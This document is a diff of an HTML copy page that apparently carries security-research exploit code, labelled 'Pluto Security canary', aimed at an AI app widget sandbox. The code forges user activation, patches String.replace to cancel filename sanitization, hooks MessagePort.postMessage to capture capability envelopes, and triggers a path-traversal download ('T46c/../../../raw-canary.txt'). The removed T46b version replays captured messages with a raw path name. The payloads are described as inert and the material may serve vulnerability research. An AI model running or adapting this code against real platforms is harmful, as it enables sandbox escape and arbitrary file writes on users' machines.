@@ -1,17 +1,19 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>T46b clean copy page</title></head>
+<head><meta charset="utf-8"><title>T46c clean copy page</title></head>
 <body style="font-family:monospace;background:#111;color:#ccc;padding:20px">
-<h2 style="color:#f33">T46b CLEAN COPY PAGE (download replay bypass, auto-run) &mdash; click Copy, then paste into the playground editor</h2>
+<h2 style="color:#f33">T46c CLEAN COPY PAGE (sanitizer neutralization) &mdash; click Copy, then paste into the playground editor</h2>
 <button id="copy" style="font-size:18px;padding:10px 20px">Copy code</button>
-<pre id="code" style="background:#000;color:#0f0;padding:12px;white-space:pre;overflow:auto">// T46b - download message replay bypass, no login screen (Pluto Security canary)
-// Auto-runs: captures the real download message (capability + post-sanitize
-// name) on the runner window, replays it with a RAW PATH NAME, skipping the
-// widget-side wrapper. Inert canaries only; disk is ground truth.
+<pre id="code" style="background:#000;color:#0f0;padding:12px;white-space:pre;overflow:auto">// T46c - sanitizer localization + neutralization (Pluto Security research canary)
+// Patches String.replace/replaceAll in the WIDGET realm: any replace that
+// modifies our canary filename is logged and NEUTRALIZED (returns the input
+// unchanged). Also logs every MessagePort.postMessage envelope containing the
+// download/capability. Then fires ONE anchor download with a path-carrying
+// canary name. If the sanitizer lives in the widget realm, the message leaves
+// with the RAW name - disk is ground truth. Inert canaries only.
 (function () {
   var API = window.oai || window.openai || window.webplus;
   var d = document;
-  var p = window.parent;
 
   try {
     Object.defineProperty(navigator, "userActivation", {
@@ -20,94 +22,89 @@
     });
   } catch (e) {}
 
-  window.__t46 = { raw: null, data: null, origin: null, ports: 0, n: 0 };
-  try {
-    p.addEventListener("message", function (e) {
+  window.__t46log = [];
+  function log(m) { window.__t46log.push(m); }
+
+  // 1) neutralize any replace()/replaceAll() that modifies our canary name
+  [ ["replace", String.prototype.replace], ["replaceAll", String.prototype.replaceAll] ].forEach(function (pair) {
+    var name = pair[0], orig = pair[1];
+    String.prototype[name] = function () {
+      var out = orig.apply(this, arguments);
       try {
-        var s = JSON.stringify(e.data);
-        if (s &amp;&amp; s.indexOf("capability") !== -1) {
-          window.__t46.data = e.data;
-          window.__t46.raw = s;
-          window.__t46.origin = e.origin;
-          window.__t46.ports = (e.ports || []).length;
-          window.__t46.n++;
-          try {
-            var b = p.document.getElementById("t46rb");
-            if (!b) {
-              b = p.document.createElement("div");
-              b.id = "t46rb";
-              b.style.cssText = "position:fixed;left:8px;top:8px;z-index:2147483647;font:11px Menlo,monospace;color:#ff5252;background:rgba(0,0,0,.85);border:1px solid #ff5252;border-radius:4px;padding:4px 8px;max-width:70vw;white-space:pre-wrap";
-              p.document.body.appendChild(b);
-            }
-            b.textContent = "T46 captured download message (" + s.length + " chars, ports=" + window.__t46.ports + "):\n" + s.slice(0, 600);
-          } catch (e2) {}
+        var self = String(this);
+        if (self.indexOf("T46c") !== -1 &amp;&amp; out !== self) {
+          log("SANITIZE-CAUGHT " + name + ": '" + self + "' -&gt; '" + out + "' [NEUTRALIZED - raw name preserved]");
+          return self;
         }
-      } catch (err) {}
-    }, false);
+      } catch (e) {}
+      return out;
+    };
+  });
+
+  // 2) log download/capability envelopes leaving through MessageChannel ports
+  try {
+    var origPmp = MessagePort.prototype.postMessage;
+    MessagePort.prototype.postMessage = function (m) {
+      try {
+        var s = JSON.stringify(m);
+        if (s &amp;&amp; (s.indexOf("capability") !== -1 || s.indexOf("download") !== -1 || s.indexOf("T46c") !== -1)) {
+          window.__t46port = { env: m, port: this };
+          log("PORT-ENVELOPE: " + s.slice(0, 900));
+        }
+      } catch (e) { log("port log err " + e); }
+      return origPmp.apply(this, arguments);
+    };
   } catch (e) {}
 
+  // 3) status box
   var ov = d.createElement("div");
-  ov.id = "t46-ov";
+  ov.id = "t46c-ov";
   var css = d.createElement("style");
   css.textContent = [
-    "#t46-ov{position:fixed;left:50%;top:50%;transform:translate(-50%,-50%);z-index:2147483647;width:560px;max-width:calc(100vw - 48px);max-height:calc(100vh - 48px);overflow:auto;box-sizing:border-box;background:#212121;border:2px solid #ff5252;border-radius:12px;padding:20px;font-family:Menlo,Consolas,monospace;font-size:12px;color:#ff8a8a;line-height:1.6}",
-    "#t46-ov b{color:#ff5252;font-size:13px}",
-    "#t46-ov pre{white-space:pre-wrap;word-break:break-all;color:#ffc9c9;margin:6px 0}"
+    "#t46c-ov{position:fixed;left:50%;top:50%;transform:translate(-50%,-50%);z-index:2147483647;width:600px;max-width:calc(100vw - 48px);max-height:calc(100vh - 48px);overflow:auto;box-sizing:border-box;background:#212121;border:2px solid #ff5252;border-radius:12px;padding:20px;font-family:Menlo,Consolas,monospace;font-size:12px;color:#ff8a8a;line-height:1.6}",
+    "#t46c-ov b{color:#ff5252;font-size:13px}",
+    "#t46c-ov pre{white-space:pre-wrap;word-break:break-all;color:#ffc9c9;margin:6px 0}"
   ].join("");
   ov.appendChild(css);
-
   ov.innerHTML =
-    "&lt;b&gt;T46 RESEARCH CANARY \u2014 Pluto Security (inert demo)&lt;/b&gt;&lt;br&gt;" +
-    '&lt;div id="t46-s1"&gt;1 anchor download (name T46/../../../canary.txt): firing...&lt;/div&gt;' +
-    '&lt;div id="t46-s2"&gt;2 captured envelope: waiting...&lt;/div&gt;' +
-    '&lt;div id="t46-s3"&gt;3 replay with raw name ../T46b-raw.txt: waiting...&lt;/div&gt;' +
-    '&lt;pre id="t46-pre"&gt;&lt;/pre&gt;';
+    "&lt;b&gt;T46c RESEARCH CANARY \u2014 Pluto Security (inert)&lt;/b&gt;&lt;br&gt;" +
+    '&lt;div id="t46c-s1"&gt;1 firing anchor download (name T46c/../../../raw-canary.txt)...&lt;/div&gt;' +
+    '&lt;div id="t46c-s2"&gt;2 waiting for logs...&lt;/div&gt;' +
+    '&lt;pre id="t46c-pre"&gt;&lt;/pre&gt;';
   d.body.appendChild(ov);
 
   function setS(id, t) { var e = d.getElementById(id); if (e) e.textContent = t; }
 
+  // 4) the single anchor download
   try {
-    var blob = new Blob(["T46 research canary - Pluto Security - " + new Date().toISOString() + "\n"], { type: "text/plain" });
+    var blob = new Blob(["T46c research canary - Pluto Security - " + new Date().toISOString() + "\n"], { type: "text/plain" });
     var a = d.createElement("a");
     a.href = URL.createObjectURL(blob);
-    a.download = "T46/../../../canary.txt";
+    a.download = "T46c/../../../raw-canary.txt";
     d.body.appendChild(a);
     a.click();
     a.remove();
-    setS("t46-s1", "1 anchor download fired (name T46/../../../canary.txt)");
-  } catch (e) { setS("t46-s1", "1 anchor download threw: " + e); }
+    setS("t46c-s1", "1 anchor download fired (name T46c/../../../raw-canary.txt)");
+  } catch (e) { setS("t46c-s1", "1 anchor download threw: " + e); }
 
   setTimeout(function () {
-    var t = window.__t46;
-    if (t &amp;&amp; t.raw) {
-      setS("t46-s2", "2 captured envelope (" + t.n + " msg(s), origin=" + t.origin + ", ports=" + t.ports + "):");
-      var pre = d.getElementById("t46-pre");
-      if (pre) pre.textContent = t.raw.slice(0, 1500);
-      setTimeout(function () {
-        try {
-          var env = structuredClone(t.data);
-          var name0 = null;
-          (function walk(o) {
-            if (!o || typeof o !== "object") return;
-            for (var k in o) {
-              var v = o[k];
-              if (typeof v === "string" &amp;&amp; (v.indexOf("canary") !== -1 || v.indexOf("T46") !== -1)) { name0 = v; o[k] = "../T46b-raw.txt"; }
-              else if (v &amp;&amp; typeof v === "object") walk(v);
-            }
-          })(env);
-          if (name0 === null) {
-            setS("t46-s3", "3 replay: no name field found in envelope - NOT replayed (see envelope)");
-          } else {
-            p.postMessage(env, "*");
-            setS("t46-s3", "3 replayed: '" + name0 + "' -&gt; '../T46b-raw.txt' posted to runner window. Tell the researcher - disk is ground truth.");
-          }
-        } catch (e) { setS("t46-s3", "3 replay threw: " + e); }
-      }, 1500);
-    } else {
-      setS("t46-s2", "2 captured envelope: NOTHING captured (interception differs - report)");
-      setS("t46-s3", "3 replay: skipped");
-    }
-  }, 1500);
+    var logs = window.__t46log;
+    setS("t46c-s2", "2 logs (" + logs.length + "):");
+    var pre = d.getElementById("t46c-pre");
+    if (pre) pre.textContent = logs.join("\n").slice(0, 2000) || "(no sanitize caught, no port envelope seen - sanitizer is NOT in the widget realm)";
+    // also mirror to runner document so it survives app rebuilds
+    try {
+      var p = window.parent;
+      var b = p.document.getElementById("t46c-rb");
+      if (!b) {
+        b = p.document.createElement("div");
+        b.id = "t46c-rb";
+        b.style.cssText = "position:fixed;left:8px;top:8px;z-index:2147483647;font:11px Menlo,monospace;color:#ff5252;background:rgba(0,0,0,.85);border:1px solid #ff5252;border-radius:4px;padding:4px 8px;max-width:70vw;white-space:pre-wrap";
+        p.document.body.appendChild(b);
+      }
+      b.textContent = "T46c logs (" + logs.length + "):\n" + logs.join("\n").slice(0, 1200);
+    } catch (e) {}
+  }, 2500);
 })();
 </pre>
 <script>
